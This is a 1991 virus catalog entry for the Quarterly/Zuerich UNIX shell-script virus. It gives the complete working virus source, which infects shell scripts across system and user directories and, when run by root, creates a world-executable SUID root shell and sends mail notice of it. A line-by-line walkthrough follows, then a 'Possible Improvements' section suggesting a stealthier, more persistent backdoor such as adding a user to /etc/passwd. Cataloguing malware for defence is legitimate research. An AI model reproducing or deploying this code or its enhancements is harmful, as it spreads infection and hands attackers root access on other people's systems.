@@ -1,0 +1,155 @@
+= Computer Virus Catalog 1.2: Quarterly / Zuerich Virus (23-Aug-1991) =
+Entry...............: Quarterly / Zuerich Virus
+Alias(es)...........: USENIX-Virus
+Virus Strain........: Quarterly strain
+Virus detected when.: 1985 / 1991
+              where.: ? / Zuerich
+Classification......: (Bourne-)Shell-script-virus, direct action, 
+                      prefix
+Length of Virus.....: almost 680 Bytes in 25 lines
+--------------------- Preconditions ----------------------------------
+Operating System(s).: UNIX
+Version/Release.....: *
+Computer model(s)...: *
+--------------------- Attributes -------------------------------------
+Easy Identification.: The virus resides in the beginning of a Shell-
+                      script. 
+                      The end of the viral part of the script is 
+                      marked: "# mark" and a command in the viral code 
+                      is looking for this mark : "... grep '^# mark$'.
+Type of infection...: The virus is executed as a background process.
+                      All outputs are redirected to /dev/null.
+                      It infects all shell-scripts in the directories 
+                      described below. A shell-script must start with 
+                      "#!/bin/sh". Already infected scripts aren't
+                      infected twice. The virus and the uninfected
+                      script are concatenated in the /tmp-directory
+                      and then copied to replace the original script.
+Infection Trigger...: Any time an infected shell-script is run.
+Storage media affected: Filesystem-directories: /bin, /usr/bin, 
+                        /u*/*/bin and the currently active directory
+Damage..............: copies the shell /bin/sh with superuser-status
+                      to /bin/gift, gives access to all users and 
+                      sets the SUID-bit. Anyone who executes /bin/gift
+                      gains superuser-status. 
+Damage Trigger......: an infected script is run by 'root'
+Particularities.....: 
+Similarities........: ---
+--------------------- Agents -----------------------------------------
+Countermeasures.....: 
+Countermeasures successful: 
+Standard means......: Files without write permission cannot get 
+                      infected, even the owner can save the files that 
+                      way (the virus doesn't use chmod to access a 
+                      file).
+                      Root must be very careful with any shell-script. 
+--------------------- Acknowledgement --------------------------------
+Location............: Virus Test Center, University Hamburg, Germany
+Classification......: Uwe Ellermann
+Documentation by....: Uwe Ellermann
+Date................: 23-August-1991
+Update..............: 
+Information Source..: DEC ULTRIX Reference Pages
+===================== End of Quarterly / Zuerich - Virus =============
+
+
+Virus code:
+----------------------------------------
+( 1)  #!/bin/sh
+( 2)
+( 3)  ( for i in * /bin/* /usr/bin/* /u*/*/bin/* ; do
+( 4)      if sed 1q $i | grep '^#![     ]*/bin/sh' ; then
+( 5)        if grep '^# mark$' $i ; then
+( 6)          :
+( 7)        else
+( 8)          trap "/bin/rm -f /tmp/x$$" 0 1 2 13 15
+( 9)          sed 1q $i > /tmp/x$$
+(10)          sed '1d
+(11)              /^#mark$/q' $0 >> /tmp/x$$
+(12)          sed 1d $i >> /tmp/x$$
+(13)          cp /tmp/x$$ $i
+(14)        fi
+(15)      fi
+(16)    done
+(17)    if ls -l /tmp/x$$ | grep root ; then
+(18)      /bin/rm -f /tmp/gift
+(19)      cp /bin/sh /tmp/gift
+(20)      chmod 4777 /tmp/gift
+(21)      echo gift | mail  # insert E-mail address here
+(22)    fi
+(23)    /bin/rm /tmp/x$$
+(24)  ) >/dev/null 2>/dev/null &
+(25)  # mark
+----------------------------------------
+End of virus code
+
+
+Description in detail:
+======================
+line (1): Marks the file as a shell-script file.
+line (3): Runs line 4 to line 16 for every file matching the four patterns.
+          Assigns the filenames sequentially to the variable i.
+line (4): Tests the first line of a file for the pattern, that begins 
+          with a string like the one in line 1. If such a string is
+          found, the file must be a shell-script.
+line (5): Tests, if the virus is already in the shell-script.
+line (6):    if yes then do nothing.
+line (8-13): else infect the file.
+line (8): Traps the incoming signals 0 1 2 13 15 (that are logout, hangup,
+          interrupt, write to a pipe with no one to read it, software 
+          termination signal)
+          removes the file /tmp/x$$ when a signal is received.
+          ($$ is replaced by the process-number.)
+line (9): Create the file /tmp/x$$ and copy the first line of the 
+          uninfected file to it (i.e. '#!/bin/sh').
+line (10+11): Append the virus-code to the tmp-file. (line 2 till '# mark')
+line (12): Append the rest of the uninfected file to the tmp-file.
+line (13): Copy the tmp-file to the uninfected file. This erases the 
+           uninfected file - write-permission must be given.
+           If no write-permission is available, the file remains 
+           uninfected!
+line (17): If the file was executed by 'root' and a file was infected,
+           a security hole is created (line 18-21).
+line (19): Copies the shell /bin/sh to /tmp/gift. The owner of /tmp/gift 
+           is root.
+line (20): chmod gives access to /tmp/gift to all users and sets the 
+           SUID-bit (Set User ID). All commands given with the 
+           /tmp/gift - shell will have root-privileges.
+line (21): Mails someone, that the security-hole is created. This gives 
+           a trace to the attacker.
+line (24): All outputs of this process are redirected to /dev/null
+           & this process is a background-process.           
+line (25): The end-mark of the virus-code.
+
+Possible Improvements: 
+======================
+Recognition of shell-scripts: usually they  don't need to start 
+with "#!/bin/sh".
+  -> 'file'-command gives information about a file, but is very slow.
+The security-hole: The /tmp-directory is cleared from time to time 
+(i.e. reboot)
+  -> /bin would perhaps be better, but would cause more suspicion.
+The security-hole: Someone who wants to take advantage of the 
+security-hole must have access to the system. It can only give 
+su-privilege to users of the system. 
+  -> adding a new user to the /etc/passwd 
+Traces / Identification: If a file gets infected, its owner-name is 
+changed to the name of the user, who executed the virus. So the 
+occurence of changed owner-names could cause suspicion.
+                      
+Epidemic considerations:
+========================
+  The affected directories /bin and /usr/bin are not likely to get
+infected, unless root executes an infected shell-script. Users are
+(usually) not allowed to write to these directories. 
+  The directories /u*/*/bin are not available in the test-environment.
+Instead /usr/users/*/bin would hit the script-files  of different 
+users in the test-environment.
+  During a typical infection a user would execute an infected 
+script-file (usually owned by another user, but with execution-
+permission to public) infecting all shell-scripts the users has write-
+permission to. Usually this should(!) only be the files owned by 
+the user. But if the user is root, all script-files - also files
+of other users - will get infected. This shows (once again) the 
+danger in the superuser-concept.
+                 
